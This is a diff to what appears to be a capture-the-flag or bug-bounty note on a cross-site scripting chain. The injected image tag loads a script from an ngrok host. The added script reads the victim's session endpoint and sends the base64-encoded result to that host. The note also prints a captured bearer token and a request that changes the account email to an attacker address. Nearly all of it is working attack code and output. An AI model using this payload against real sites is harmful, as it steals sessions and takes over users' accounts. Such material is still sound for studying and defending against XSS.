@@ -70,6 +70,39 @@ Hello World :-)
 "><img/src=x onerror=import("https://664a-83-213-97-233.ngrok-free.app/1.js")>
 ```
 
+1.js
 ```js
 alert(1);//
 ```
+
+2.js
+```js
+var xhr = new XMLHttpRequest();
+xhr.open('GET', '/api/v1/me/session', true);
+xhr.onload = function() {
+    if (xhr.status === 200) {
+        fetch('https://664a-83-213-97-233.ngrok-free.app/POC/?x=' + btoa(xhr.responseText));
+    }
+};
+xhr.send();
+
+alert(1);
+```
+
+![[Pasted image 20241217185744.png]]
+
+```json
+{"session":{"token":"Authentication: Bearer 295c621d5331792f1ca8dd19013f236d79df609bdf47cb5d986d544030f80215"}}
+```
+
+## 1
+
+```js
+var xhr = new XMLHttpRequest();
+xhr.open('POST', '/change-email', true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send('email=hacker@hacker.ctf');
+```
+
+
+
